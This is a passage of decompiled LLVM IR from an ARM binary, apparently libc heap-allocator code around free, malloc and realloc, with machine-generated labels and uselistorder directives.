  %v0_e988 = load i32, i32* %r2.global-to-local, align 4
  %v1_e988 = load i32, i32* %r1.global-to-local, align 4
  %v2_e988 = add i32 %v1_e988, 8
  %v3_e988 = inttoptr i32 %v2_e988 to i32*
  store i32 %v0_e988, i32* %v3_e988, align 4
  %v0_e98c = load i32, i32* %r2.global-to-local, align 4
  %v1_e98c = load i32, i32* %r1.global-to-local, align 4
  %v2_e98c = add i32 %v1_e98c, 4
  %v3_e98c = inttoptr i32 %v2_e98c to i32*
  store i32 %v0_e98c, i32* %v3_e98c, align 4
  br i1 %v2_e978, label %dec_label_pc_e994, label %dec_label_pc_e9ac

dec_label_pc_e994:                                ; preds = %dec_label_pc_e964
  %v0_e994 = load i32, i32* @r6, align 4
  %v1_e994 = add i32 %v0_e994, 836
  %v2_e994 = inttoptr i32 %v1_e994 to i32*
  %v3_e994 = load i32, i32* %v2_e994, align 4
  store i32 %v3_e994, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_e99c = load i32, i32* %ip.global-to-local, align 4
  %v1_e99c = add i32 %v0_e99c, 8
  store i32 %v1_e99c, i32* @r0, align 4
  store i32 -1, i32* %v2_e994, align 4
  %v0_e9a4 = call i32 @free()
  store i32 %v0_e9a4, i32* %r0.global-to-local, align 4
  %v0_e9a8 = load i32, i32* @r4, align 4
  %v1_e9a8 = load i32, i32* @r6, align 4
  %v2_e9a8 = add i32 %v1_e9a8, 836
  %v3_e9a8 = inttoptr i32 %v2_e9a8 to i32*
  store i32 %v0_e9a8, i32* %v3_e9a8, align 4
  br label %dec_label_pc_e9ac

dec_label_pc_e9ac:                                ; preds = %.thread34, %dec_label_pc_e964, %dec_label_pc_e930, %dec_label_pc_e928, %dec_label_pc_e994
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r0.global-to-local, align 4
  %v4_e9b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e9b4, i32* %lr.global-to-local, align 4
  %v1_e9b8 = add i32 %v4_e9b4, 872
  store i32 %v1_e9b8, i32* %r1.global-to-local, align 4
  %v1_e9bc = inttoptr i32 %v1_e9b8 to i32*
  %v2_e9bc = load i32, i32* %v1_e9bc, align 4
  store i32 %v2_e9bc, i32* %r1.global-to-local, align 4
  %v3_e9bc = add i32 %v4_e9b4, 876
  %v4_e9bc = inttoptr i32 %v3_e9bc to i32*
  %v5_e9bc = load i32, i32* %v4_e9bc, align 4
  store i32 %v5_e9bc, i32* %r3.global-to-local, align 4
  %v1_e9c4 = add i32 %v4_e9b4, 868
  %v2_e9c4 = inttoptr i32 %v1_e9c4 to i32*
  %v3_e9c4 = load i32, i32* %v2_e9c4, align 4
  store i32 %v3_e9c4, i32* %r3.global-to-local, align 4
  %v1_e9c8 = add i32 %v4_e9b4, 884
  %v2_e9c8 = inttoptr i32 %v1_e9c8 to i32*
  %v3_e9c8 = load i32, i32* %v2_e9c8, align 4
  store i32 %v3_e9c8, i32* %r2.global-to-local, align 4
  %v2_e9cc = add i32 %v3_e9c4, %v2_e9bc
  store i32 %v2_e9cc, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_e9bc, %v5_e9bc
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_e9ac
  store i32 %v2_e9bc, i32* %v4_e9bc, align 4
  %v0_e9d4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_e9d4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_e9ac, %bb165
  %v1_e9d4 = phi i32 [ %v3_e9c8, %dec_label_pc_e9ac ], [ %v1_e9d4.pre, %bb165 ]
  %v4_e9d8 = phi i32 [ %v2_e9cc, %dec_label_pc_e9ac ], [ %v0_e9d4.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_e9d8, %v1_e9d4
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_e9d8 = load i32, i32* %lr.global-to-local, align 4
  %v6_e9d8 = add i32 %v5_e9d8, 884
  %v7_e9d8 = inttoptr i32 %v6_e9d8 to i32*
  store i32 %v4_e9d8, i32* %v7_e9d8, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_e9dc = load i32, i32* %lr.global-to-local, align 4
  %v1_e9dc = add i32 %v0_e9dc, 44
  %v2_e9dc = inttoptr i32 %v1_e9dc to i32*
  %v3_e9dc = load i32, i32* %v2_e9dc, align 4
  store i32 %v3_e9dc, i32* %ip.global-to-local, align 4
  %v1_e9e0 = add i32 %v3_e9dc, 4
  %v2_e9e0 = inttoptr i32 %v1_e9e0 to i32*
  %v3_e9e0 = load i32, i32* %v2_e9e0, align 4
  store i32 %v1_e5f4, i32* %r1.global-to-local, align 4
  %v1_e9e8 = and i32 %v3_e9e0, -4
  store i32 %v1_e9e8, i32* %r3.global-to-local, align 4
  %v3_e9ec = icmp ult i32 %v1_e9e8, %v1_e5f4
  br i1 %v3_e9ec, label %dec_label_pc_ea18, label %dec_label_pc_e9f4

dec_label_pc_e9f4:                                ; preds = %bb168
  %v0_e9f4 = load i32, i32* @sl, align 4
  %v2_e9f4 = sub i32 %v1_e9e8, %v0_e9f4
  %v2_e9f8 = add i32 %v0_e9f4, %v3_e9dc
  store i32 %v2_e9f8, i32* %r1.global-to-local, align 4
  %v1_e9fc = or i32 %v2_e9f4, 1
  store i32 %v1_e9fc, i32* %r3.global-to-local, align 4
  %v1_ea00 = or i32 %v0_e9f4, 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ea04 = add i32 %v3_e9dc, 8
  store i32 %v1_ea04, i32* %r0.global-to-local, align 4
  store i32 %v1_ea00, i32* %v2_e9e0, align 4
  %v0_ea0c = load i32, i32* %r1.global-to-local, align 4
  %v1_ea0c = load i32, i32* %lr.global-to-local, align 4
  %v2_ea0c = add i32 %v1_ea0c, 44
  %v3_ea0c = inttoptr i32 %v2_ea0c to i32*
  store i32 %v0_ea0c, i32* %v3_ea0c, align 4
  %v0_ea10 = load i32, i32* %r3.global-to-local, align 4
  %v1_ea10 = load i32, i32* %r1.global-to-local, align 4
  %v2_ea10 = add i32 %v1_ea10, 4
  %v3_ea10 = inttoptr i32 %v2_ea10 to i32*
  store i32 %v0_ea10, i32* %v3_ea10, align 4
  br label %dec_label_pc_ea30

dec_label_pc_ea18:                                ; preds = %bb157, %bb168, %dec_label_pc_e7f4
  store i32 87624, i32* %r3.global-to-local, align 4
  %v0_ea1c = call i32 @__aeabi_read_tp()
  %v3_ea20 = load i16, i16* @global_var_24070.401, align 2
  %v4_ea20 = sext i16 %v3_ea20 to i32
  store i32 %v4_ea20, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_ea28 = add i32 %v4_ea20, %v0_ea1c
  %v4_ea28 = inttoptr i32 %v3_ea28 to i32*
  store i32 12, i32* %v4_ea28, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ea30

dec_label_pc_ea30:                                ; preds = %bb151, %bb150, %dec_label_pc_e9f4, %dec_label_pc_e63c, %dec_label_pc_ea18
  %v0_ea30 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ea30, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ea34

dec_label_pc_ea34:                                ; preds = %.thread1, %dec_label_pc_e608, %.thread121, %dec_label_pc_e478, %dec_label_pc_e46c, %dec_label_pc_e2d4, %dec_label_pc_e258, %dec_label_pc_ea30
  store i32 %v2_e178, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 48, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v4_ea44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 48) to i32*), align 4
  store i32 %v4_ea44, i32* @ip, align 4
  store i32 59984, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ea44)
  br label %dec_label_pc_ea50

dec_label_pc_ea50:                                ; preds = %dec_label_pc_e1b0, %dec_label_pc_ea34
  %v0_ea50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ea50, i32* %r0.global-to-local, align 4
  store i32 %v3_e14c, i32* @r4, align 4
  store i32 %v6_e14c, i32* @r5, align 4
  store i32 %v9_e14c, i32* @r6, align 4
  store i32 %v12_e14c, i32* @r7, align 4
  store i32 %v15_e14c, i32* @r8, align 4
  store i32 %v18_e14c, i32* @sb, align 4
  store i32 %v21_e14c, i32* @sl, align 4
  store i32 %v24_e14c, i32* @fp, align 4
  store i32 %v27_e14c, i32* @lr, align 4
  ret i32 %v0_ea50

; uselistorder directives
  uselistorder i32 %v0_e9f4, { 1, 0, 2 }
  uselistorder i32 %v3_e9dc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e9d8, { 1, 0 }
  uselistorder i32 %v2_e9bc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_e9b4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_e96c, { 1, 2, 0 }
  uselistorder i32 %v0_e934, { 1, 0 }
  uselistorder i32 %v0_e928, { 1, 0 }
  uselistorder i32 %v2_e918, { 1, 0 }
  uselistorder i32 %v2_e8a8, { 2, 1, 0 }
  uselistorder i32 %v2_e890, { 1, 2, 0, 3 }
  uselistorder i32 %v2_e888, { 1, 0, 2 }
  uselistorder i32 %v1_e884, { 2, 1, 0 }
  uselistorder i32 %v0_e884, { 3, 1, 2, 0 }
  uselistorder i32 %v1_e868, { 1, 0 }
  uselistorder i32 %v2_e840, { 1, 0 }
  uselistorder i32 %v3_e834, { 1, 0, 2 }
  uselistorder i32 %v2_e814, { 1, 0, 2 }
  uselistorder i32* %v2_e80c, { 1, 0, 2 }
  uselistorder i32 %v0_e7f4, { 1, 0 }
  uselistorder i32 %v6_e7d0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_e7bc, { 2, 1, 0 }
  uselistorder i32 %v0_e7a4, { 1, 0 }
  uselistorder i32 %v2_e760, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e75c, { 1, 0 }
  uselistorder i32 %v3_e734, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_e714, { 1, 0, 2 }
  uselistorder i32 %v2_e6fc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_e6a4, { 2, 1, 0 }
  uselistorder i32 %v6_e698, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_e674, { 2, 1, 0, 3 }
  uselistorder i32 %v3_e634, { 1, 0, 2, 3 }
  uselistorder i32 %v0_e5f4, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_e5ec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e5e8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_e5d4, { 1, 0 }
  uselistorder i32 %v7_e594, { 1, 0 }
  uselistorder i32 %v4_e594, { 1, 0 }
  uselistorder i32 %v0_e564, { 1, 0 }
  uselistorder i32 %v2_e538, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_e53454, { 1, 0 }
  uselistorder i32 %v1_e500, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_e4e8., { 1, 2, 0 }
  uselistorder i32 %v0_e4f0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_e4f0, { 1, 0 }
  uselistorder i32 %v3_e4d0, { 1, 0 }
  uselistorder i32 %v4_e4cc, { 1, 0, 2 }
  uselistorder i32 %v1_e43c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e494, { 1, 0 }
  uselistorder i32 %v1_e478, { 1, 0 }
  uselistorder i32 %v1_e318, { 1, 0 }
  uselistorder i32 %v0_e458, { 2, 0, 1, 3 }
  uselistorder i32 %v3_e420, { 2, 0, 1, 3 }
  uselistorder i32 %v0_e4b4.pre, { 1, 2, 0 }
  uselistorder i32 %v0_e3fc, { 2, 1, 0 }
  uselistorder i32 %v3_e3f0, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_e310, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_e3b8, { 1, 0 }
  uselistorder i32 %v3_e3ac, { 1, 0 }
  uselistorder i32 %v0_e3b8, { 1, 0 }
  uselistorder i32 %v3_e390, { 0, 2, 3, 1 }
  uselistorder i32 %v2_e380, { 1, 0, 2 }
  uselistorder i32 %v3_e338, { 2, 1, 0 }
  uselistorder i32 %v0_e328, { 3, 2, 1, 0 }
  uselistorder i32 %v0_e2f8, { 1, 0 }
  uselistorder i32 %v1_e2ac, { 2, 1, 0, 3 }
  uselistorder i32 %v0_e2a8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_e24c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_e240, { 1, 0 }
  uselistorder i32 %v3_e210, { 1, 0 }
  uselistorder i32 %v0_e204, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_e1e4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_e1d8, { 1, 0 }
  uselistorder i32 %v0_e1a8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 91, 87, 88, 89, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 29, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 30, 28, 58, 31, 32, 59, 33, 34, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 10, 12, 9, 13, 14, 15, 16, 17, 18, 19, 20, 21, 42, 22, 23, 35, 34, 27, 24, 0, 25, 26, 28, 29, 30, 31, 32, 33, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_ea50, { 1, 0 }
  uselistorder label %dec_label_pc_ea34, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_ea30, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ea18, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_e9ac, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_e928, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e920, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_e7f4, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_e728, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_e5e0, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_e534, { 1, 0 }
  uselistorder label %dec_label_pc_e53c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e500, { 1, 0 }
  uselistorder label %dec_label_pc_e4b4, { 1, 0 }
  uselistorder label %dec_label_pc_e448, { 1, 0 }
  uselistorder label %dec_label_pc_e444, { 1, 0 }
  uselistorder label %dec_label_pc_e3f0, { 1, 0 }
  uselistorder label %dec_label_pc_e3dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e3a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e390, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_ea64(i32 %arg1) local_unnamed_addr {
dec_label_pc_ea64:
  %v0_ea64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ea64, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_ea64
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_ea64, %bb
  %v10_ea80 = phi i32 [ %arg1, %dec_label_pc_ea64 ], [ 0, %bb ]
  ret i32 %v10_ea80

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_ea84 = load i32, i32* @r4, align 4
  %v6_ea84 = load i32, i32* @r5, align 4
  %v9_ea84 = load i32, i32* @r6, align 4
  %v12_ea84 = load i32, i32* @r7, align 4
  %v15_ea84 = load i32, i32* @r8, align 4
  %v18_ea84 = load i32, i32* @sb, align 4
  %v21_ea84 = load i32, i32* @sl, align 4
  %v24_ea84 = load i32, i32* @fp, align 4
  %v27_ea84 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_ea90 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v0_ea9c = load i32, i32* @r1, align 4
  store i32 %v0_ea9c, i32* @r6, align 4
  br i1 %v2_ea90, label %dec_label_pc_eaa4, label %dec_label_pc_eab4

dec_label_pc_eaa4:                                ; preds = %entry
  store i32 %v0_ea9c, i32* %r0.global-to-local, align 4
  %v1_eaa8 = call i32 @malloc(i32 %v0_ea9c)
  store i32 %v1_eaa8, i32* %r0.global-to-local, align 4
  store i32 %v1_eaa8, i32* @r4, align 4
  br label %dec_label_pc_ee14

dec_label_pc_eab4:                                ; preds = %entry
  %v2_eab4 = icmp eq i32 %v0_ea9c, 0
  br i1 %v2_eab4, label %dec_label_pc_eabc, label %dec_label_pc_eac8

dec_label_pc_eabc:                                ; preds = %dec_label_pc_eab4
  %v0_eabc = call i32 @free()
  store i32 %v0_eabc, i32* %r0.global-to-local, align 4
  %v0_eac0 = load i32, i32* @r6, align 4
  store i32 %v0_eac0, i32* @r4, align 4
  br label %dec_label_pc_ee14

dec_label_pc_eac8:                                ; preds = %dec_label_pc_eab4
  store i32 116, i32* %r3.global-to-local, align 4
  %v4_ead0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 116) to i32*), align 4
  store i32 %v4_ead0, i32* @r4, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 %v4_ead0, i32* %r2.global-to-local, align 4
  %v4_eadc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 72) to i32*), align 4
  store i32 %v4_eadc, i32* %r1.global-to-local, align 4
  %v2_eae0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_eae0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_eae8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_eae8)
  %v0_eaf4 = load i32, i32* @r4, align 4
  store i32 %v0_eaf4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r1.global-to-local, align 4
  %v4_eb00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 16) to i32*), align 4
  store i32 %v4_eb00, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_eb0c.560 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_eb00)
  %v0_eb0c = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_eb0c, -32
  br i1 %tmp36, label %dec_label_pc_eb30, label %dec_label_pc_eb14

dec_label_pc_eb14:                                ; preds = %dec_label_pc_eac8
  store i32 ptrtoint (i32* @global_var_1554c.562 to i32), i32* %r2.global-to-local, align 4
  %v0_eb18 = call i32 @__aeabi_read_tp()
  store i32 %v0_eb18, i32* %r0.global-to-local, align 4
  %v3_eb1c = load i16, i16* @global_var_24070.401, align 2
  %v4_eb1c = sext i16 %v3_eb1c to i32
  store i32 %v4_eb1c, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_eb28 = add i32 %v4_eb1c, %v0_eb18
  %v4_eb28 = inttoptr i32 %v3_eb28 to i32*
  store i32 12, i32* %v4_eb28, align 4
  br label %dec_label_pc_ee14

dec_label_pc_eb30:                                ; preds = %dec_label_pc_eac8
  %v1_eb30 = add i32 %v0_eb0c, 11
  store i32 %v1_eb30, i32* %r0.global-to-local, align 4
  %v0_eb34 = load i32, i32* @r5, align 4
  %v1_eb34 = add i32 %v0_eb34, -4
  %v2_eb34 = inttoptr i32 %v1_eb34 to i32*
  %v3_eb34 = load i32, i32* %v2_eb34, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_eb38 = icmp ugt i32 %v1_eb30, 14
  %v7_eb38 = icmp eq i32 %v1_eb30, 15
  %v2_eb3c = xor i1 %v2_eb38, true
  %v3_eb3c = or i1 %v7_eb38, %v2_eb3c
  br i1 %v3_eb3c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_eb30
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_eb30, %bb
  %v2_eb40 = xor i1 %v7_eb38, true
  %v3_eb40 = and i1 %v2_eb38, %v2_eb40
  br i1 %v3_eb40, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_eb40 = and i32 %v1_eb30, -8
  store i32 %v5_eb40, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_eb44 = and i32 %v3_eb34, 2
  %v2_eb44 = icmp eq i32 %v1_eb44, 0
  %v1_eb48 = add i32 %v0_eb34, -8
  store i32 %v1_eb48, i32* @sl, align 4
  %v1_eb4c = and i32 %v3_eb34, -4
  store i32 %v1_eb4c, i32* @r6, align 4
  br i1 %v2_eb44, label %dec_label_pc_eb54, label %dec_label_pc_ed2c

dec_label_pc_eb54:                                ; preds = %bb29
  %v1_eb54 = load i32, i32* @sb, align 4
  %v3_eb54 = icmp ult i32 %v1_eb4c, %v1_eb54
  br i1 %v3_eb54, label %dec_label_pc_eb60, label %bb30

bb30:                                             ; preds = %dec_label_pc_eb54
  store i32 %v1_eb4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ecc4

dec_label_pc_eb60:                                ; preds = %dec_label_pc_eb54
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_eb68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_eb68, i32* %r0.global-to-local, align 4
  %v1_eb6c = add i32 %v4_eb68, 44
  %v2_eb6c = inttoptr i32 %v1_eb6c to i32*
  %v3_eb6c = load i32, i32* %v2_eb6c, align 4
  store i32 %v3_eb6c, i32* %r3.global-to-local, align 4
  %v2_eb70 = add i32 %v1_eb4c, %v1_eb48
  store i32 %v2_eb70, i32* @r4, align 4
  %v9_eb74 = icmp eq i32 %v2_eb70, %v3_eb6c
  %v1_eb78 = add i32 %v2_eb70, 4
  %v2_eb78 = inttoptr i32 %v1_eb78 to i32*
  %v3_eb78 = load i32, i32* %v2_eb78, align 4
  store i32 %v3_eb78, i32* %r1.global-to-local, align 4
  br i1 %v9_eb74, label %dec_label_pc_eb80, label %dec_label_pc_ebbc

dec_label_pc_eb80:                                ; preds = %dec_label_pc_eb60
  %v1_eb80 = and i32 %v3_eb78, -4
  %v2_eb84 = add i32 %v1_eb80, %v1_eb4c
  store i32 %v2_eb84, i32* %r1.global-to-local, align 4
  %v1_eb88 = add i32 %v1_eb54, 16
  store i32 %v1_eb88, i32* %r3.global-to-local, align 4
  %v3_eb8c = icmp ult i32 %v2_eb84, %v1_eb88
  br i1 %v3_eb8c, label %dec_label_pc_ec10, label %dec_label_pc_eb94

dec_label_pc_eb94:                                ; preds = %dec_label_pc_eb80
  %v2_eb94 = sub i32 %v2_eb84, %v1_eb54
  %v1_eb98 = urem i32 %v3_eb34, 2
  %v2_eb9c = add i32 %v1_eb54, %v1_eb48
  store i32 %v2_eb9c, i32* %r1.global-to-local, align 4
  %v2_eba0 = or i32 %v1_eb54, %v1_eb98
  store i32 %v2_eba0, i32* %r2.global-to-local, align 4
  %v1_eba4 = or i32 %v2_eb94, 1
  store i32 %v1_eba4, i32* %r3.global-to-local, align 4
  store i32 %v0_eb34, i32* @r4, align 4
  store i32 %v2_eba0, i32* %v2_eb34, align 4
  %v0_ebb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_ebb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_ebb0 = add i32 %v1_ebb0, 44
  %v3_ebb0 = inttoptr i32 %v2_ebb0 to i32*
  store i32 %v0_ebb0, i32* %v3_ebb0, align 4
  %v0_ebb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_ebb4 = load i32, i32* %r1.global-to-local, align 4
  %v2_ebb4 = add i32 %v1_ebb4, 4
  %v3_ebb4 = inttoptr i32 %v2_ebb4 to i32*
  store i32 %v0_ebb4, i32* %v3_ebb4, align 4
  br label %dec_label_pc_edf8

dec_label_pc_ebbc:                                ; preds = %dec_label_pc_eb60
  %v1_ebbc = and i32 %v3_eb78, -2
  %v2_ebc0 = add i32 %v1_ebbc, %v2_eb70
  store i32 %v2_ebc0, i32* %r3.global-to-local, align 4
  %v1_ebc4 = add i32 %v2_ebc0, 4
  %v2_ebc4 = inttoptr i32 %v1_ebc4 to i32*
  %v3_ebc4 = load i32, i32* %v2_ebc4, align 4
  store i32 %v3_ebc4, i32* %r3.global-to-local, align 4
  %v1_ebc8 = urem i32 %v3_ebc4, 2
  %v2_ebc8 = icmp eq i32 %v1_ebc8, 0
  br i1 %v2_ebc8, label %dec_label_pc_ebd0, label %dec_label_pc_ec10

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_ebbc
  %v1_ebd0 = and i32 %v3_eb78, -4
  store i32 %v1_ebd0, i32* %r3.global-to-local, align 4
  %v2_ebd4 = add i32 %v1_ebd0, %v1_eb4c
  store i32 %v2_ebd4, i32* %r0.global-to-local, align 4
  %v3_ebd8 = icmp ult i32 %v2_ebd4, %v1_eb54
  br i1 %v3_ebd8, label %dec_label_pc_ec10, label %dec_label_pc_ebe0

dec_label_pc_ebe0:                                ; preds = %dec_label_pc_ebd0
  %v1_ebe0 = add i32 %v1_eb4c, %v0_eb34
  %v2_ebe0 = inttoptr i32 %v1_ebe0 to i32*
  %v3_ebe0 = load i32, i32* %v2_ebe0, align 4
  store i32 %v3_ebe0, i32* %r1.global-to-local, align 4
  %v1_ebe4 = add i32 %v3_ebe0, 12
  %v2_ebe4 = inttoptr i32 %v1_ebe4 to i32*
  %v3_ebe4 = load i32, i32* %v2_ebe4, align 4
  store i32 %v3_ebe4, i32* %r3.global-to-local, align 4
  %v9_ebe8 = icmp eq i32 %v3_ebe4, %v2_eb70
  %v1_ebec = add i32 %v2_eb70, 12
  %v2_ebec = inttoptr i32 %v1_ebec to i32*
  %v3_ebec = load i32, i32* %v2_ebec, align 4
